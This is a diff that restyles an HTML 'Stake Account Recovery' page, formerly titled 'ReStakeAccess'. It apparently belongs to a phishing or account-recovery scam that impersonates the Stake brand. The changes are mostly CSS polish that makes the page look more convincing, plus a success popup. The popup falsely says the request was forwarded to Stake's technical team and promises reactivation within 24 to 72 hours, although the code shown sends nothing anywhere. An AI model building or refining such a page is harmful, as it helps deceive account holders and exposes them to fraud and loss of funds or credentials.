@@ -2,106 +2,158 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ReStakeAccess Account Recovery</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Stake Account Recovery</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
   <style>
-    body {
+    * {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #0f212e;
-      color: #fff;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      background: radial-gradient(circle at top left, #1a2a3b, #0f212e);
+      color: #ffffff;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      overflow: hidden;
     }
+
+    ::-webkit-scrollbar {
+      width: 6px;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #02dc05;
+      border-radius: 4px;
+    }
+
     .container {
-      background-color: #2f4553;
-      padding: 20px;
-      border-radius: 12px;
+      background: rgba(47, 69, 83, 0.9);
+      backdrop-filter: blur(8px);
+      padding: 25px;
+      border-radius: 16px;
+      box-shadow: 0 0 20px rgba(2, 220, 5, 0.15);
       width: 90%;
-      max-width: 500px;
-      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+      max-width: 480px;
       position: relative;
       z-index: 1;
     }
+
+    .header {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .header img {
+      width: 120px;
+      margin-bottom: 10px;
+    }
+
+    .header h2 {
+      color: #02dc05;
+      font-size: 1.8rem;
+      font-weight: 600;
+    }
+
     .form-group {
       margin-bottom: 15px;
     }
+
     label {
+      font-weight: 500;
+      margin-bottom: 6px;
       display: block;
-      margin-bottom: 5px;
-      font-weight: bold;
+      color: #ffffff;
     }
-    input, select, button {
+
+    input, select {
       width: 100%;
       padding: 10px;
-      border-radius: 6px;
-      border: none;
-      font-size: 1rem;
+      background: #11232f;
+      border: 2px solid transparent;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 0.95rem;
+      transition: border 0.3s;
     }
+
+    input:focus, select:focus {
+      border: 2px solid #02dc05;
+      outline: none;
+    }
+
     button {
-      background-color: #02dc05;
-      color: white;
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background: #02dc05;
+      color: #0f212e;
+      font-weight: bold;
+      font-size: 1rem;
       cursor: pointer;
+      transition: all 0.3s ease;
     }
+
+    button:hover {
+      box-shadow: 0 0 10px #02dc05, 0 0 20px #02dc05;
+    }
+
     button:disabled {
-      background-color: #555;
+      background: #555;
+      color: #aaa;
       cursor: not-allowed;
+      box-shadow: none;
     }
+
     .copy-btn {
       margin-top: 5px;
       background-color: #166ae0;
+      color: #fff;
     }
+
     .message {
-      margin-top: 10px;
       font-size: 0.9rem;
       color: #00ff9d;
+      margin-top: 8px;
     }
+
     #popup {
+      display: none;
       position: fixed;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background-color: #2f4553;
+      background-color: rgba(47, 69, 83, 0.95);
       color: #fff;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      padding: 25px;
+      border-radius: 14px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
       z-index: 9999;
+      animation: fadeIn 0.4s ease;
+      max-width: 90%;
       text-align: center;
-      display: none;
     }
-    #popup button {
-      margin-top: 10px;
-      padding: 10px 20px;
-      background-color: #02dc05;
+
+    #popup p {
+      font-size: 1rem;
+      color: #ffdc00;
+      font-weight: 500;
     }
+
     .blur {
       filter: blur(5px);
       pointer-events: none;
       user-select: none;
     }
-    .header {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    .header img {
-      width: 120px;
-      margin-bottom: 10px;
-      margin-top: 30px;
-    }
-    .header h2 {
-      color: #02dc05;
-      font-weight: bold;
-      font-family: 'Arial', sans-serif;
-      font-size: 1.5rem;
-    }
-    #popup p {
-      color: #ffdc00;
-      font-family: 'Arial', sans-serif;
-      font-weight: bold;
-      font-size: 1.1rem;
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95) translate(-50%, -50%); }
+      to { opacity: 1; transform: scale(1) translate(-50%, -50%); }
     }
   </style>
 </head>
@@ -156,11 +208,11 @@
     </div>
 
     <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
-  </div> <!-- ✅ Closing main-content div here -->
+  </div>
 
   <div id="popup">
     <p>Your account recovery request has been successfully received. We have forwarded your request to the Stake technical team for prompt action. Your Stake account will be fully reactivated within 24 to 72 hours.</p>
-    <button onclick="closePopup()">OK</button>
+    <button onclick="location.reload()">OK</button>
   </div>
 
   <script>
@@ -229,10 +281,6 @@
     function submitForm() {
       document.getElementById('main-content').classList.add('blur');
       document.getElementById('popup').style.display = 'block';
-    }
-
-    function closePopup() {
-      location.reload();
     }
   </script>
 </body>
